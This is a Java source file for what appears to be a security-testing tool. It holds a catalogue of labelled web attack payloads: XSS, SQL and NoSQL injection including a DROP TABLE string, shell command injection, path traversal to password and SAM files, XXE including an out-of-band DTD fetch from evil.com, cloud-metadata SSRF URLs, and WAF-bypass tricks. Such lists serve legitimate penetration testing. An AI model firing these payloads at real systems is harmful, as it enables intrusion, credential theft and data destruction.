import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Common payload templates for security testing.
 */
public final class PayloadTranscoderTemplates {

    private PayloadTranscoderTemplates() {}

    public static Map<String, byte[]> getTemplates() {
        Map<String, byte[]> m = new LinkedHashMap<>();
        // --- XSS ---
        m.put("XSS: <script>alert(1)</script>", "<script>alert(1)</script>".getBytes(StandardCharsets.UTF_8));
        m.put("XSS: <img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>".getBytes(StandardCharsets.UTF_8));
        m.put("XSS: \"-alert(1)-\"", "\"-alert(1)-\"".getBytes(StandardCharsets.UTF_8));
        // --- SQLi ---
        m.put("SQLi: ' OR '1'='1", "' OR '1'='1".getBytes(StandardCharsets.UTF_8));
        m.put("SQLi: 1' UNION SELECT NULL--", "1' UNION SELECT NULL--".getBytes(StandardCharsets.UTF_8));
        m.put("SQLi: 1; DROP TABLE users--", "1; DROP TABLE users--".getBytes(StandardCharsets.UTF_8));
        // --- Command injection ---
        m.put("Cmd: ; id", "; id".getBytes(StandardCharsets.UTF_8));
        m.put("Cmd: | whoami", "| whoami".getBytes(StandardCharsets.UTF_8));
        m.put("Cmd: `id`", "`id`".getBytes(StandardCharsets.UTF_8));
        m.put("Cmd: $(id)", "$(id)".getBytes(StandardCharsets.UTF_8));
        // --- Path traversal ---
        m.put("Path: ../../../etc/passwd", "../../../etc/passwd".getBytes(StandardCharsets.UTF_8));
        m.put("Path: ..\\..\\..\\windows\\system32\\config\\sam", "..\\..\\..\\windows\\system32\\config\\sam".getBytes(StandardCharsets.UTF_8));
        // --- SSTI ---
        m.put("SSTI: {{7*7}}", "{{7*7}}".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: ${7*7}", "${7*7}".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: <%= 7*7 %>", "<%= 7*7 %>".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: Jinja2 {{config}}", "{{config}}".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: Jinja2 {{''.__class__.__mro__[1].__subclasses__()}}", "{{''.__class__.__mro__[1].__subclasses__()}}".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: Freemarker ${7*7}", "${7*7}".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: Freemarker [#assign ex=7*7]${ex}", "[#assign ex=7*7]${ex}".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: Velocity #set($x=7*7)$x", "#set($x=7*7)$x".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: Pebble {{ 7*7 }}", "{{ 7*7 }}".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: Smarty {php}echo 7*7;{/php}", "{php}echo 7*7;{/php}".getBytes(StandardCharsets.UTF_8));
        m.put("SSTI: MVEL #{7*7}", "#{7*7}".getBytes(StandardCharsets.UTF_8));
        // --- LDAP ---
        m.put("LDAP: *)(uid=*))(|(uid=*", "*)(uid=*))(|(uid=*".getBytes(StandardCharsets.UTF_8));
        // --- XXE ---
        m.put("XXE: <!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">".getBytes(StandardCharsets.UTF_8));
        m.put("XXE: OOB <!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">", "<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">".getBytes(StandardCharsets.UTF_8));
        // --- Prototype pollution ---
        m.put("Proto: {\"__proto__\":{\"polluted\":true}}", "{\"__proto__\":{\"polluted\":true}}".getBytes(StandardCharsets.UTF_8));
        // --- JWT ---
        m.put("JWT: none alg", "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"user\"}.".getBytes(StandardCharsets.UTF_8));
        // --- SSRF: Cloud metadata ---
        m.put("SSRF: AWS metadata 169.254.169.254", "http://169.254.169.254/latest/meta-data/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: GCP metadata 169.254.169.254", "http://metadata.google.internal/computeMetadata/v1/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: Azure metadata 169.254.169.254", "http://169.254.169.254/metadata/instance?api-version=2021-02-01".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: Alibaba metadata 100.100.100.200", "http://100.100.100.200/latest/meta-data/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: DigitalOcean metadata 169.254.169.254", "http://169.254.169.254/metadata/v1/".getBytes(StandardCharsets.UTF_8));
        // --- SSRF: Localhost bypasses ---
        m.put("SSRF: 127.0.0.1", "http://127.0.0.1/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: 0.0.0.0", "http://0.0.0.0/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: localhost", "http://localhost/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: [::1]", "http://[::1]/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: 127.1", "http://127.1/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: 2130706433 (127.0.0.1)", "http://2130706433/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: 0x7f000001", "http://0x7f000001/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: 127.0.0.1.nip.io", "http://127.0.0.1.nip.io/".getBytes(StandardCharsets.UTF_8));
        // --- SSRF: Internal ranges ---
        m.put("SSRF: 10.0.0.1", "http://10.0.0.1/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: 172.16.0.1", "http://172.16.0.1/".getBytes(StandardCharsets.UTF_8));
        m.put("SSRF: 192.168.1.1", "http://192.168.1.1/".getBytes(StandardCharsets.UTF_8));
        // --- NoSQL injection ---
        m.put("NoSQL: $gt bypass {\"$gt\":\"\"}", "{\"$gt\":\"\"}".getBytes(StandardCharsets.UTF_8));
        m.put("NoSQL: $ne bypass {\"$ne\":null}", "{\"$ne\":null}".getBytes(StandardCharsets.UTF_8));
        m.put("NoSQL: $regex {\"$regex\":\".*\"}", "{\"$regex\":\".*\"}".getBytes(StandardCharsets.UTF_8));
        m.put("NoSQL: $where {\"$where\":\"1==1\"}", "{\"$where\":\"1==1\"}".getBytes(StandardCharsets.UTF_8));
        m.put("NoSQL: $exists {\"$exists\":true}", "{\"$exists\":true}".getBytes(StandardCharsets.UTF_8));
        m.put("NoSQL: $nin {\"$nin\":[]}", "{\"$nin\":[]}".getBytes(StandardCharsets.UTF_8));
        m.put("NoSQL: $or login bypass", "{\"$or\":[{\"user\":\"admin\"},{\"pass\":{\"$ne\":\"\"}}]}".getBytes(StandardCharsets.UTF_8));
        // --- CORS bypass ---
        m.put("CORS: null origin", "null".getBytes(StandardCharsets.UTF_8));
        m.put("CORS: https://evil.com", "https://evil.com".getBytes(StandardCharsets.UTF_8));
        m.put("CORS: https://trusted.com.evil.com", "https://trusted.com.evil.com".getBytes(StandardCharsets.UTF_8));
        m.put("CORS: https://evil.com (subdomain)", "https://subdomain.evil.com".getBytes(StandardCharsets.UTF_8));
        // --- HPP (HTTP Parameter Pollution) ---
        m.put("HPP: param=1&param=2", "param=1&param=2".getBytes(StandardCharsets.UTF_8));
        m.put("HPP: param[]=1&param[]=2", "param[]=1&param[]=2".getBytes(StandardCharsets.UTF_8));
        m.put("HPP: param=1%26param=2 (encoded &)", "param=1%26param=2".getBytes(StandardCharsets.UTF_8));
        m.put("HPP: JSON param pollution", "{\"param\":[\"1\",\"2\"]}".getBytes(StandardCharsets.UTF_8));
        // --- Polyglot ---
        m.put("Polyglot: HTML+JS+URL", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e".getBytes(StandardCharsets.UTF_8));
        m.put("Polyglot: SQL+HTML", "'\"-->]]>*/</script><script>alert(1)</script>--".getBytes(StandardCharsets.UTF_8));
        m.put("Polyglot: Mathias", "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>".getBytes(StandardCharsets.UTF_8));
        // --- Homoglyphs (WAF bypass) ---
        m.put("Homoglyph: а (Cyrillic a)", "\u0430".getBytes(StandardCharsets.UTF_8));
        m.put("Homoglyph: е (Cyrillic e)", "\u0435".getBytes(StandardCharsets.UTF_8));
        m.put("Homoglyph: о (Cyrillic o)", "\u043e".getBytes(StandardCharsets.UTF_8));
        m.put("Homoglyph: р (Cyrillic r)", "\u0440".getBytes(StandardCharsets.UTF_8));
        m.put("Homoglyph: script with Cyrillic", "\u0441\u043a\u0440\u0438\u043f\u0442".getBytes(StandardCharsets.UTF_8));
        // --- Cache poisoning ---
        m.put("Cache: X-Forwarded-Host evil.com", "X-Forwarded-Host: evil.com".getBytes(StandardCharsets.UTF_8));
        m.put("Cache: X-Original-URL /admin", "X-Original-URL: /admin".getBytes(StandardCharsets.UTF_8));
        m.put("Cache: X-Rewrite-URL /admin", "X-Rewrite-URL: /admin".getBytes(StandardCharsets.UTF_8));
        m.put("Cache: X-Host evil.com", "X-Host: evil.com".getBytes(StandardCharsets.UTF_8));
        // --- GraphQL batch/alias ---
        m.put("GraphQL: batch query", "{\"batch\":[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]}".getBytes(StandardCharsets.UTF_8));
        m.put("GraphQL: alias abuse", "{\"query\":\"{a:user{id} b:user{id} c:user{id}}\"}".getBytes(StandardCharsets.UTF_8));
        m.put("GraphQL: field duplication", "{\"query\":\"{user{id id id id}}\"}".getBytes(StandardCharsets.UTF_8));
        return m;
    }

    /** Returns templates grouped by category (XSS, SQLi, SSRF, etc.) for submenu display. */
    public static Map<String, Map<String, byte[]>> getTemplatesByCategory() {
        Map<String, Map<String, byte[]>> byCategory = new LinkedHashMap<>();
        for (var e : getTemplates().entrySet()) {
            String key = e.getKey();
            int colon = key.indexOf(':');
            String category = colon > 0 ? key.substring(0, colon) : "Other";
            byCategory.computeIfAbsent(category, k -> new LinkedHashMap<>()).put(key, e.getValue());
        }
        return byCategory;
    }
}
